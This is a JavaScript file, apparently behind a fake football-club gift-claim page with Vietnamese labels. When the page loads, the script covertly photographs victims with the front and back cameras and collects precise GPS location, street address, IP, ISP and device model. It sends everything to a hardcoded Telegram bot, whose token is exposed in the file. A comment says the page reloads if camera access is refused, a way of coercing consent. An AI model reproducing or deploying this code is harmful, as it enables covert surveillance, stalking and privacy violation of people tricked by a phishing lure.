const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: '', ip: '', isp: '', realIp: '', address: '', country: '', 
  lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } 
  else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "375x812@3": "iPhone X / XS / 11 Pro",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else {
    info.device = platform || 'PC/Khác';
    info.os = 'Khác';
  }
}

async function getIPData() {
  try {
    const r = await fetch('https://api.ipify.org?format=json').then(res => res.json());
    info.ip = r.ip;
    const res = await fetch(`https://ipwho.is/${info.ip}`).then(res => res.json());
    info.realIp = res.ip;
    info.isp = res.connection?.org || 'VNNIC';
    info.country = res.country || 'Việt Nam';
  } catch (e) { info.ip = 'Bị chặn'; }
}

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve();
    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name;
        } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
        resolve();
      },
      () => resolve(),
      { 
        enableHighAccuracy: true, // Ép dùng GPS vệ tinh
        timeout: 4500,            // Đợi tối đa 4.5s để lấy tọa độ chuẩn
        maximumAge: 0             // Luôn lấy vị trí mới nhất
      }
    );
  });
}

async function captureCamera(facingMode = 'user') {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    return new Promise(resolve => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(t => t.stop()); // Tắt cam ngay
          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
        }, 600);
      };
    });
  } catch (e) { throw e; }
}

function getCaption() {
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  return `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Thời gian:</b> ${info.time}
📱 <b>Thiết bị:</b> ${info.device} (${info.os})
🌍 <b>IP Dân cư:</b> ${info.ip}
🏢 <b>ISP:</b> ${info.isp}
🏙️ <b>Địa chỉ:</b> ${info.address || 'Đang quét...'}
📌 <b>Google Maps:</b> <a href="${mapsLink}">Bấm xem vị trí</a>
📸 <b>Camera:</b> ${info.camera}
`.trim();
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  detectDevice();
  
  let front = null, back = null;
  try {
    // 1. Chụp Cam Trước và Cam Sau (Mất ~1.5s)
    front = await captureCamera("user");
    back = await captureCamera("environment");
    info.camera = '✅ Đã chụp 2 mặt';
  } catch (e) {
    info.camera = '🚫 Từ chối quyền Cam';
    throw e; // Để HTML reload trang
  }

  // 2. Chạy lấy IP và GPS (Chạy song song, GPS chiếm 4.5s)
  // Tổng thời gian chạy main sẽ rơi vào tầm 4.8s - 5s, khớp với HTML
  await Promise.all([getIPData(), getLocation(), delay(3000)]);

  // 3. Gửi dữ liệu về Telegram
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  const media = [];
  if (front) {
    media.push({ type: 'photo', media: 'attach://front', caption: getCaption(), parse_mode: 'HTML' });
    formData.append('front', front, 'front.jpg');
  }
  if (back) {
    media.push({ type: 'photo', media: 'attach://back' });
    formData.append('back', back, 'back.jpg');
  }

  if (media.length > 0) {
    await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
  } else {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption(), parse_mode: 'HTML' })
    });
  }
}
